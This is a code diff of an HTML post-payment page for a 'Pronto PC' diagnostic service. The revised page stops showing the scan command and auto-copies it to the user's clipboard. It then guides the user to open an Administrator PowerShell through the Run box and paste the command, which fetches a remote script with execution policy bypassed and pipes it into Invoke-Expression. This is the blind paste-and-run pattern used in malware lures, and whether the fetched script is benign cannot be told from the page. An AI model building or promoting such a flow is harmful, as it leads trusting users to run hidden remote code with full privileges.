@@ -10,141 +10,297 @@
 <script>
 tailwind.config = {
   darkMode: "class",
-  theme: { extend: { colors: { "background": "#051424", "surface-container": "#122131", "on-surface": "#d4e4fa", "on-surface-variant": "#c6c6cd", "secondary": "#ffb95f", "on-secondary": "#472a00", "tertiary": "#91db2a" } } }
+  theme: { extend: { colors: {
+    "bg": "#051424", "surface": "#122131",
+    "text": "#d4e4fa", "muted": "#8b9ab5",
+    "amber": "#ffb95f", "amber-dark": "#472a00",
+    "green": "#91db2a"
+  }}}
 }
 </script>
 <style>
-  body { background-color: #051424; color: #d4e4fa; font-family: 'Inter', sans-serif; }
-  .cmd-box { font-family: 'JetBrains Mono', monospace; }
-  .copy-feedback { opacity: 0; transition: opacity 0.3s; }
-  .copy-feedback.show { opacity: 1; }
+  body { background:#051424; color:#d4e4fa; font-family:'Inter',sans-serif; }
+
+  /* Keyboard key style */
+  .key {
+    display:inline-flex; align-items:center; justify-content:center;
+    background:#0d1c2d; border:1px solid rgba(255,255,255,0.18);
+    border-bottom:3px solid rgba(0,0,0,0.4);
+    border-radius:7px; padding:5px 12px;
+    font-family:'JetBrains Mono',monospace; font-size:0.8rem;
+    color:#d4e4fa; white-space:nowrap; line-height:1;
+    box-shadow:0 2px 4px rgba(0,0,0,0.3);
+  }
+  .key.wide  { padding:5px 18px; }
+  .key.icon  { font-family:'Material Symbols Outlined'; font-size:1.1rem; padding:5px 10px; }
+  .key-plus  { color:#8b9ab5; font-size:0.75rem; margin:0 4px; }
+
+  /* Step card */
+  .step-card {
+    background:#122131; border:1px solid rgba(255,255,255,0.07);
+    border-radius:1rem; padding:1.5rem;
+  }
+  .step-num {
+    width:2.25rem; height:2.25rem; border-radius:50%;
+    background:rgba(255,185,95,0.15); border:1px solid rgba(255,185,95,0.35);
+    display:flex; align-items:center; justify-content:center;
+    font-weight:800; font-size:1rem; color:#ffb95f;
+    flex-shrink:0;
+  }
+
+  /* Copied banner */
+  @keyframes slideDown { from { opacity:0; transform:translateY(-8px); } to { opacity:1; transform:translateY(0); } }
+  .copied-banner { animation: slideDown 0.35s ease; }
+
+  .mono { font-family:'JetBrains Mono',monospace; }
 </style>
 </head>
 <body class="min-h-screen flex flex-col">
-<nav class="border-b border-white/10 bg-background/95 backdrop-blur px-6 py-4 flex items-center gap-3">
-  <a href="./index.html" class="font-bold tracking-tighter text-on-surface text-lg hover:text-secondary transition-colors">PRONTO PC</a>
-  <span class="text-on-surface-variant/40 text-sm ml-auto font-mono" id="session-badge"></span>
+
+<!-- Nav -->
+<nav class="border-b border-white/10 bg-[#051424]/95 backdrop-blur px-6 py-4 flex items-center gap-3">
+  <a href="./index.html" class="font-bold tracking-tighter text-[#d4e4fa] text-lg hover:text-[#ffb95f] transition-colors">PRONTO PC</a>
+  <span class="text-[#8b9ab5]/40 text-sm ml-auto font-mono" id="session-badge"></span>
 </nav>
-<main class="flex-1 flex flex-col items-center px-6 py-12">
-  <div id="state-verifying" class="flex flex-col items-center text-center max-w-lg">
-    <div class="inline-flex items-center gap-3 bg-white/10 text-on-surface-variant font-bold text-lg px-8 py-4 rounded-xl mb-4">
-      <span class="material-symbols-outlined animate-spin">progress_activity</span>
-      Verifying payment...
+
+<main class="flex-1 flex flex-col items-center px-4 py-10">
+
+  <!-- ── Verifying ── -->
+  <div id="state-verifying" class="flex flex-col items-center text-center max-w-md pt-12">
+    <div class="inline-flex items-center gap-3 bg-white/8 text-[#8b9ab5] font-semibold text-lg px-8 py-4 rounded-xl mb-3">
+      <span class="material-symbols-outlined animate-spin" style="font-size:1.4rem">progress_activity</span>
+      Verifying your payment…
     </div>
-    <p class="text-on-surface-variant text-sm">This takes just a moment.</p>
+    <p class="text-[#8b9ab5] text-sm">Just a moment.</p>
   </div>
-  <div id="state-error" class="hidden flex flex-col items-center text-center max-w-lg">
-    <div class="inline-flex items-center gap-3 bg-red-900/30 border border-red-500/30 text-red-300 font-bold text-sm px-6 py-4 rounded-xl mb-4">
-      <span class="material-symbols-outlined shrink-0">error</span>
+
+  <!-- ── Error ── -->
+  <div id="state-error" class="hidden flex-col items-center text-center max-w-md pt-12">
+    <div class="flex items-start gap-3 bg-red-950/50 border border-red-500/30 text-red-300 text-sm px-6 py-4 rounded-xl mb-4">
+      <span class="material-symbols-outlined shrink-0 text-lg mt-0.5">error</span>
       <span id="error-msg">Could not verify payment.</span>
     </div>
-    <p class="text-on-surface-variant text-sm mt-2">Need help? Email <a href="mailto:support@prontopc.online" class="text-secondary hover:underline">support@prontopc.online</a></p>
+    <p class="text-[#8b9ab5] text-sm mt-1">Need help? <a href="mailto:support@prontopc.online" class="text-[#ffb95f] hover:underline">support@prontopc.online</a></p>
   </div>
-  <div id="state-active" class="hidden w-full max-w-2xl space-y-8">
+
+  <!-- ── Active ── -->
+  <div id="state-active" class="hidden w-full max-w-xl space-y-5">
+
+    <!-- Confirmed -->
+    <div class="text-center pt-2 pb-1">
+      <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-[#91db2a]/10 border border-[#91db2a]/25 mb-4">
+        <span class="material-symbols-outlined text-[#91db2a] text-base" style="font-variation-settings:'FILL' 1">check_circle</span>
+        <span class="text-[#91db2a] font-mono text-xs tracking-widest uppercase">Payment Confirmed</span>
+      </div>
+      <h1 class="text-3xl font-black text-[#d4e4fa] leading-tight">
+        Ready to scan your PC.<br>
+        <span class="text-[#ffb95f]">Follow the steps below.</span>
+      </h1>
+      <p class="text-[#8b9ab5] mt-2 text-sm">Takes about 30 seconds. Nothing is installed on your computer.</p>
+    </div>
+
+    <!-- Copied banner (shown after clipboard write) -->
+    <div id="copied-banner" class="hidden copied-banner">
+      <div class="flex items-center gap-3 bg-[#91db2a]/10 border border-[#91db2a]/30 rounded-xl px-5 py-4">
+        <span class="material-symbols-outlined text-[#91db2a] text-2xl shrink-0" style="font-variation-settings:'FILL' 1">content_paste</span>
+        <div>
+          <p class="text-[#91db2a] font-bold">Your command is ready to paste!</p>
+          <p class="text-[#8b9ab5] text-sm">It's been copied to your clipboard automatically. Follow the steps below.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Copy needed banner (shown if auto-copy failed) -->
+    <div id="copy-needed" class="hidden">
+      <div class="flex items-center gap-3 bg-[#ffb95f]/10 border border-[#ffb95f]/30 rounded-xl px-5 py-4">
+        <span class="material-symbols-outlined text-[#ffb95f] text-2xl shrink-0">content_copy</span>
+        <div class="flex-1">
+          <p class="text-[#ffb95f] font-bold">First, copy your command</p>
+          <p class="text-[#8b9ab5] text-sm">Click the button to copy it, then follow the steps below.</p>
+        </div>
+        <button onclick="copyCommand()" class="shrink-0 bg-[#ffb95f] text-[#472a00] font-bold text-sm px-4 py-2 rounded-lg hover:opacity-90 transition-opacity">
+          Copy Command
+        </button>
+      </div>
+    </div>
+
+    <!-- STEP 1 -->
+    <div class="step-card">
+      <div class="flex items-start gap-4">
+        <div class="step-num">1</div>
+        <div class="flex-1">
+          <p class="font-bold text-[#d4e4fa] text-lg">Open the Run box</p>
+          <p class="text-[#8b9ab5] text-sm mt-1 mb-4">Hold the <strong class="text-[#d4e4fa]">Windows key</strong> and press <strong class="text-[#d4e4fa]">R</strong> at the same time.</p>
+          <div class="flex items-center gap-1 flex-wrap">
+            <span class="key icon">window</span>
+            <span class="key-plus">+</span>
+            <span class="key wide">R</span>
+          </div>
+          <p class="text-[#8b9ab5] text-xs mt-3">A small box will appear in the bottom-left corner of your screen.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="step-card">
+      <div class="flex items-start gap-4">
+        <div class="step-num">2</div>
+        <div class="flex-1">
+          <p class="font-bold text-[#d4e4fa] text-lg">Type <span class="mono text-[#ffb95f]">powershell</span> into the box</p>
+          <p class="text-[#8b9ab5] text-sm mt-1 mb-4">Type exactly what you see below — don't press Enter yet.</p>
+          <div class="bg-black/30 border border-white/10 rounded-lg px-4 py-3 inline-block">
+            <span class="mono text-[#ffb95f] text-lg tracking-wide select-all">powershell</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="step-card">
+      <div class="flex items-start gap-4">
+        <div class="step-num">3</div>
+        <div class="flex-1">
+          <p class="font-bold text-[#d4e4fa] text-lg">Hold <strong class="text-[#ffb95f]">Ctrl + Shift</strong>, then press <strong class="text-[#ffb95f]">Enter</strong></p>
+          <p class="text-[#8b9ab5] text-sm mt-1 mb-4">This opens PowerShell as Administrator. Keep Ctrl and Shift held down while you press Enter.</p>
+          <div class="flex items-center gap-1 flex-wrap">
+            <span class="key">Ctrl</span>
+            <span class="key-plus">+</span>
+            <span class="key">Shift</span>
+            <span class="key-plus">+</span>
+            <span class="key">Enter</span>
+          </div>
+          <div class="mt-4 bg-blue-950/40 border border-blue-500/20 rounded-lg px-4 py-3 flex items-start gap-3">
+            <span class="material-symbols-outlined text-blue-400 shrink-0 text-lg mt-0.5">shield</span>
+            <p class="text-[#8b9ab5] text-sm"><strong class="text-[#d4e4fa]">A blue permission popup will appear.</strong> This is Windows asking for your OK. Click <strong class="text-[#ffb95f]">Yes</strong>.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="step-card border-[#ffb95f]/20" style="border-color:rgba(255,185,95,0.2); background:rgba(255,185,95,0.04);">
+      <div class="flex items-start gap-4">
+        <div class="step-num">4</div>
+        <div class="flex-1">
+          <p class="font-bold text-[#d4e4fa] text-lg">Paste and press <strong class="text-[#ffb95f]">Enter</strong></p>
+          <p class="text-[#8b9ab5] text-sm mt-1 mb-4">A dark window has opened. Press <strong class="text-[#d4e4fa]">Ctrl+V</strong> to paste your command, then press <strong class="text-[#d4e4fa]">Enter</strong>.</p>
+          <div class="flex items-center gap-1 flex-wrap">
+            <span class="key">Ctrl</span>
+            <span class="key-plus">+</span>
+            <span class="key">V</span>
+            <span class="key-plus mx-3" style="margin:0 12px">then</span>
+            <span class="key">Enter</span>
+          </div>
+          <p class="text-[#8b9ab5] text-xs mt-4">The scan will start and takes about 30 seconds. A report will be saved to your Desktop when it finishes.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Re-copy button -->
     <div class="text-center">
-      <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-tertiary/10 border border-tertiary/30 mb-4">
-        <span class="material-symbols-outlined text-tertiary text-lg" style="font-variation-settings:'FILL' 1;">check_circle</span>
-        <span class="text-tertiary font-mono text-sm tracking-widest uppercase">Payment Confirmed</span>
-      </div>
-      <h1 class="text-3xl md:text-4xl font-black text-on-surface leading-tight">Your Custodian Technician<br><span class="text-secondary">is ready.</span></h1>
-      <p class="text-on-surface-variant mt-3 max-w-md mx-auto">Follow the steps below, or chat with your Custodian for guided help. Everything happens with your permission.</p>
+      <button onclick="copyCommand()" class="inline-flex items-center gap-2 text-[#8b9ab5] hover:text-[#d4e4fa] text-sm border border-white/10 hover:border-white/20 rounded-lg px-4 py-2 transition-all">
+        <span class="material-symbols-outlined text-base">content_copy</span>
+        Copy command again
+      </button>
+      <span id="recopy-confirm" class="ml-3 text-[#91db2a] text-xs opacity-0 transition-opacity">Copied!</span>
     </div>
-    <div class="bg-surface-container rounded-2xl border border-white/10 p-6">
-      <div class="flex items-start gap-4">
-        <div class="shrink-0 w-10 h-10 rounded-full bg-secondary/20 border border-secondary/40 flex items-center justify-center font-bold text-secondary">1</div>
-        <div class="flex-1">
-          <h3 class="font-bold text-on-surface text-lg mb-2">Open PowerShell as Administrator</h3>
-          <div class="space-y-2 text-on-surface-variant text-sm">
-            <p>Click the <strong class="text-on-surface">Start menu</strong> and type <span class="cmd-box bg-white/5 px-1.5 py-0.5 rounded text-xs">PowerShell</span></p>
-            <p>Right-click <strong class="text-on-surface">Windows PowerShell</strong> and choose <strong class="text-secondary">Run as administrator</strong></p>
-            <p>Click <strong class="text-on-surface">Yes</strong> when Windows asks for permission</p>
-          </div>
-        </div>
+
+    <!-- Copilot chat embed -->
+    <div class="step-card overflow-hidden !p-0">
+      <div class="px-5 py-4 border-b border-white/8 flex items-center gap-2">
+        <span class="material-symbols-outlined text-[#ffb95f]">support_agent</span>
+        <h3 class="font-bold text-[#d4e4fa]">Need help? Chat with your Custodian</h3>
+      </div>
+      <div id="copilot-embed" class="min-h-[360px] flex items-center justify-center text-[#8b9ab5] text-sm p-6 text-center">
+        Your Custodian Technician is here if you get stuck on any step.
       </div>
     </div>
-    <div class="bg-surface-container rounded-2xl border border-white/10 p-6">
-      <div class="flex items-start gap-4">
-        <div class="shrink-0 w-10 h-10 rounded-full bg-secondary/20 border border-secondary/40 flex items-center justify-center font-bold text-secondary">2</div>
-        <div class="flex-1">
-          <h3 class="font-bold text-on-surface text-lg mb-2">Paste this command and press Enter</h3>
-          <div class="relative mt-3">
-            <div id="scan-command" class="cmd-box bg-black/40 border border-white/10 rounded-xl p-4 pr-14 text-sm text-secondary break-all select-all cursor-text">Loading command...</div>
-            <button onclick="copyCommand()" class="absolute top-3 right-3 p-2 rounded-lg bg-white/10 hover:bg-white/20 transition-colors" title="Copy to clipboard">
-              <span class="material-symbols-outlined text-on-surface-variant text-lg">content_copy</span>
-            </button>
-            <span id="copy-feedback" class="copy-feedback absolute top-3 right-14 text-tertiary text-xs font-mono mt-2">Copied!</span>
-          </div>
-          <p class="text-on-surface-variant text-xs mt-3">This runs a diagnostic scan. Nothing is installed. Takes about 30 seconds.</p>
-        </div>
-      </div>
-    </div>
-    <div class="bg-surface-container rounded-2xl border border-white/10 p-6">
-      <div class="flex items-start gap-4">
-        <div class="shrink-0 w-10 h-10 rounded-full bg-secondary/20 border border-secondary/40 flex items-center justify-center font-bold text-secondary">3</div>
-        <div class="flex-1">
-          <h3 class="font-bold text-on-surface text-lg mb-2">Review your results</h3>
-          <p class="text-on-surface-variant text-sm">Once the scan completes, your Custodian Technician will present the findings in plain English. You decide what to repair.</p>
-        </div>
-      </div>
-    </div>
-    <div class="bg-surface-container rounded-2xl border border-white/10 overflow-hidden">
-      <div class="px-6 py-4 border-b border-white/10 flex items-center gap-2">
-        <span class="material-symbols-outlined text-secondary">support_agent</span>
-        <h3 class="font-bold text-on-surface">Your Custodian Technician</h3>
-      </div>
-      <div id="copilot-embed" class="min-h-[500px] flex items-center justify-center text-on-surface-variant text-sm">
-        <p class="text-center px-6">Chat with your Custodian for step-by-step guidance, or follow the steps above on your own.</p>
-      </div>
-    </div>
-    <div class="bg-white/5 border border-white/10 rounded-xl p-5 text-center">
-      <p class="text-on-surface-variant text-sm">Your session is active for <strong class="text-on-surface">3 days</strong>. You can close this page and return anytime.</p>
-      <p class="text-on-surface-variant text-xs mt-2">Need help? <a href="mailto:support@prontopc.online" class="text-secondary hover:underline">support@prontopc.online</a></p>
-    </div>
-  </div>
+
+    <!-- Session info -->
+    <p class="text-center text-[#8b9ab5]/50 text-xs pb-4">
+      Session active for <strong class="text-[#8b9ab5]/80">3 days</strong> — you can close this page and return anytime.
+      &nbsp;·&nbsp; <a href="mailto:support@prontopc.online" class="text-[#ffb95f]/70 hover:text-[#ffb95f]">support@prontopc.online</a>
+    </p>
+
+  </div><!-- /state-active -->
 </main>
-<footer class="border-t border-white/10 py-6 px-6 text-center text-on-surface-variant text-xs">
-  &copy; 2026 5D Service Solutions Global LLC &middot;
-  <a href="./privacy.html" class="hover:text-secondary transition-colors">Privacy</a> &middot;
-  <a href="./terms.html" class="hover:text-secondary transition-colors">Terms</a> &middot;
-  <a href="./index.html" class="hover:text-secondary transition-colors">Home</a>
+
+<footer class="border-t border-white/8 py-5 px-6 text-center text-[#8b9ab5]/50 text-xs">
+  &copy; 2026 5D Service Solutions Global LLC &nbsp;·&nbsp;
+  <a href="./privacy.html" class="hover:text-[#ffb95f] transition-colors">Privacy</a> &nbsp;·&nbsp;
+  <a href="./terms.html" class="hover:text-[#ffb95f] transition-colors">Terms</a>
 </footer>
+
 <script>
 const CLOUD_RUN = "https://pronto-pc-108655745293.us-central1.run.app";
-let sessionToken = null;
+let scanCommand = "";
+
 async function init() {
   const params = new URLSearchParams(window.location.search);
   const sessionId = params.get("session");
-  if (!sessionId) { showError("No session found. Please start from prontopc.online to begin."); return; }
+  if (!sessionId) { showError("No session found. Please start from prontopc.online."); return; }
+
   try {
-    const verifyResp = await fetch(`${CLOUD_RUN}/api/verify-payment`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId }) });
-    const verifyData = await verifyResp.json();
-    if (!verifyData.ok || !verifyData.token) { showError(verifyData.error || "Could not verify your payment. Please contact support."); return; }
-    sessionToken = verifyData.token;
-    const sessionResp = await fetch(`${CLOUD_RUN}/api/create-session`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token: sessionToken }) });
-    const sessionData = await sessionResp.json();
-    if (sessionData.ok) { showActive(sessionToken); }
-    else { showActive(sessionToken); }
-  } catch (e) { showError("Could not reach our server. Please try again or contact support@prontopc.online"); }
+    const r = await fetch(`${CLOUD_RUN}/api/verify-payment`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId })
+    });
+    const data = await r.json();
+    if (!data.ok || !data.token) { showError(data.error || "Could not verify your payment. Please contact support."); return; }
+
+    const token = data.token;
+    const scanUrl = `${CLOUD_RUN}/scan?token=${token}`;
+    scanCommand = `powershell -ExecutionPolicy Bypass -Command "irm '${scanUrl}' | iex"`;
+
+    showActive();
+    tryAutoCopy();
+  } catch {
+    showError("Could not reach our server. Please try again or contact support@prontopc.online");
+  }
 }
-function showActive(token) {
+
+async function tryAutoCopy() {
+  try {
+    await navigator.clipboard.writeText(scanCommand);
+    document.getElementById("copied-banner").classList.remove("hidden");
+  } catch {
+    // Browser blocked auto-copy (needs user gesture) — show manual copy button instead
+    document.getElementById("copy-needed").classList.remove("hidden");
+  }
+}
+
+async function copyCommand() {
+  try {
+    await navigator.clipboard.writeText(scanCommand);
+    // Swap banners
+    document.getElementById("copy-needed").classList.add("hidden");
+    document.getElementById("copied-banner").classList.remove("hidden");
+    // Flash "Copied!" next to re-copy button
+    const c = document.getElementById("recopy-confirm");
+    c.style.opacity = "1";
+    setTimeout(() => c.style.opacity = "0", 2000);
+  } catch {
+    alert("Could not copy automatically. Please contact support@prontopc.online for your scan command.");
+  }
+}
+
+function showActive() {
   document.getElementById("state-verifying").classList.add("hidden");
-  document.getElementById("state-active").classList.remove("hidden");
+  const el = document.getElementById("state-active");
+  el.classList.remove("hidden");
+  el.style.display = "";
   document.getElementById("session-badge").textContent = "Session active";
-  const scanUrl = `${CLOUD_RUN}/scan?token=${token}`;
-  document.getElementById("scan-command").textContent = `powershell -ExecutionPolicy Bypass -Command "irm '${scanUrl}' | iex"`;
 }
+
 function showError(msg) {
   document.getElementById("state-verifying").classList.add("hidden");
   document.getElementById("error-msg").textContent = msg;
-  document.getElementById("state-error").classList.remove("hidden");
+  const el = document.getElementById("state-error");
+  el.classList.remove("hidden");
+  el.style.display = "flex";
 }
-function copyCommand() {
-  navigator.clipboard.writeText(document.getElementById("scan-command").textContent).then(() => {
-    const fb = document.getElementById("copy-feedback");
-    fb.classList.add("show");
-    setTimeout(() => fb.classList.remove("show"), 2000);
-  });
-}
+
 init();
 </script>
 </body>
